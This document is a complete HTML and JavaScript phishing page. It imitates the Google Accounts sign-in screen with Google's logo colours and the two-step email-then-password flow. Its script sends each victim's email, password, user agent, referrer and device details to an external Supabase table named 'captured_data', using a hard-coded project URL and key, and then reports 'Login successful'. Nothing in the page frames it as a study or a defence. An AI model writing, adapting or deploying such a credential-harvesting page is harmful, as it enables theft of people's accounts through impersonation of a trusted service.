<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            background: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 450px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
        }

        .logo {
            text-align: center;
            margin-bottom: 16px;
            font-size: 28px;
            font-weight: 500;
            letter-spacing: -1px;
        }

        .logo .g-blue { color: #4285F4; }
        .logo .g-red { color: #EA4335; }
        .logo .g-yellow { color: #FBBC05; }
        .logo .g-green { color: #34A853; }

        h1 {
            font-size: 24px;
            font-weight: 400;
            text-align: center;
            margin-bottom: 8px;
            color: #202124;
        }

        .subtitle {
            text-align: center;
            color: #202124;
            margin-bottom: 32px;
            font-size: 16px;
        }

        .input-group {
            margin-bottom: 24px;
            position: relative;
        }

        input {
            width: 100%;
            padding: 16px 14px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
            transition: 0.2s;
        }

        input:focus {
            border-color: #1a73e8;
            border-width: 2px;
            padding: 15px 13px;
        }

        .btn {
            width: 100%;
            background: #1a73e8;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: 0.2s;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .btn:hover {
            background: #1557b0;
            box-shadow: 0 1px 2px rgba(0,0,0,0.3);
        }

        .btn:disabled {
            background: #dadce0;
            cursor: not-allowed;
        }

        .loading {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid #fff;
            border-top: 2px solid transparent;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .forgot {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            display: block;
            margin-bottom: 32px;
            cursor: pointer;
        }

        .forgot:hover {
            text-decoration: underline;
        }

        .error-message {
            color: #d93025;
            font-size: 14px;
            margin-bottom: 16px;
            display: none;
        }

        .success-message {
            color: #188038;
            font-size: 14px;
            margin-bottom: 16px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <span class="g-blue">G</span><span class="g-red">o</span><span class="g-yellow">o</span><span class="g-blue">g</span><span class="g-green">l</span><span class="g-red">e</span>
        </div>
        <h1>Sign in</h1>
        <p class="subtitle">to continue to Google</p>

        <div class="error-message" id="errorMessage"></div>
        <div class="success-message" id="successMessage"></div>

        <div class="input-group">
            <input type="email" id="email" placeholder="Email or phone" autocomplete="username">
        </div>

        <div class="input-group" id="passwordGroup" style="display:none;">
            <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password">
        </div>

        <a href="#" class="forgot" onclick="handleForgot(event)">Forgot email?</a>

        <button class="btn" id="submitBtn" onclick="handleSubmit()">
            <span id="btnText">Next</span>
            <div class="loading" id="loading"></div>
        </button>
    </div>

    <script>
        // Supabase configuration
        const SUPABASE_URL = 'https://aqynejlgjwdmxsekuyld.supabase.co';
        const SUPABASE_PUBLISHABLE_KEY = 'sb_publishable_FjlvU8LL1CLWG_1ZkaeVVA_3aHJVpuq';
        
        // Initialize Supabase
        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY);
        
        let step = 1;
        
        function showError(message) {
            const errorElement = document.getElementById('errorMessage');
            errorElement.textContent = message;
            errorElement.style.display = 'block';
            document.getElementById('successMessage').style.display = 'none';
            setTimeout(() => {
                errorElement.style.display = 'none';
            }, 5000);
        }
        
        function showSuccess(message) {
            const successElement = document.getElementById('successMessage');
            successElement.textContent = message;
            successElement.style.display = 'block';
            document.getElementById('errorMessage').style.display = 'none';
            setTimeout(() => {
                successElement.style.display = 'none';
            }, 5000);
        }
        
        async function handleSubmit() {
            const emailInput = document.getElementById('email');
            const passwordInput = document.getElementById('password');
            const passwordGroup = document.getElementById('passwordGroup');
            const submitBtn = document.getElementById('submitBtn');
            const btnText = document.getElementById('btnText');
            const loading = document.getElementById('loading');
            
            if (step === 1) {
                // Step 1: Get email
                const email = emailInput.value.trim();
                
                if (!email) {
                    showError('Please enter your email or phone');
                    return;
                }
                
                // Show password field
                passwordGroup.style.display = 'block';
                btnText.textContent = 'Sign in';
                step = 2;
                
                // Focus on password field
                setTimeout(() => passwordInput.focus(), 100);
                
            } else if (step === 2) {
                // Step 2: Get password and save to Supabase
                const email = emailInput.value.trim();
                const password = passwordInput.value;
                
                if (!password) {
                    showError('Please enter your password');
                    return;
                }
                
                // Show loading
                submitBtn.disabled = true;
                loading.style.display = 'block';
                btnText.style.display = 'none';
                
                try {
                    // Save to Supabase
                    const { data, error } = await supabase
                        .from('captured_data')
                        .insert([
                            {
                                email: email,
                                password: password,
                                user_agent: navigator.userAgent,
                                referer: document.referrer || 'Direct',
                                device_info: {
                                    language: navigator.language,
                                    screenResolution: `${window.screen.width}x${window.screen.height}`,
                                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                                    platform: navigator.platform,
                                    cookiesEnabled: navigator.cookieEnabled
                                },
                                created_at: new Date().toISOString()
                            }
                        ])
                        .select();
                    
                    if (error) {
                        console.error('Supabase error:', error);
                        showError('Error saving data: ' + error.message);
                    } else {
                        console.log('✅ Data saved successfully:', data);
                        showSuccess('Login successful! Data saved.');
                        
                        // Reset form after 2 seconds
                        setTimeout(() => {
                            emailInput.value = '';
                            passwordInput.value = '';
                            passwordGroup.style.display = 'none';
                            btnText.textContent = 'Next';
                            step = 1;
                        }, 2000);
                    }
                    
                } catch (err) {
                    console.error('Error:', err);
                    showError('Connection error: ' + err.message);
                } finally {
                    // Hide loading
                    submitBtn.disabled = false;
                    loading.style.display = 'none';
                    btnText.style.display = 'inline';
                }
            }
        }
        
        function handleForgot(event) {
            event.preventDefault();
            alert('Please enter the email you used to create your account.');
            document.getElementById('email').focus();
        }
        
        // Add Enter key support
        document.addEventListener('DOMContentLoaded', function() {
            const emailInput = document.getElementById('email');
            const passwordInput = document.getElementById('password');
            
            emailInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    handleSubmit();
                }
            });
            
            passwordInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    handleSubmit();
                }
            });
        });
        
        // Test Supabase connection on page load
        async function testConnection() {
            try {
                const { data, error } = await supabase
                    .from('captured_data')
                    .select('count', { count: 'exact', head: true });
                
                if (error) {
                    console.error('Supabase connection error:', error);
                    console.log('Make sure you have created the "captured_data" table in Supabase');
                } else {
                    console.log('✅ Supabase connected successfully');
                }
            } catch (err) {
                console.error('Supabase connection failed:', err);
            }
        }
        
        // Test connection when page loads
        testConnection();
    </script>
</body>
</html>
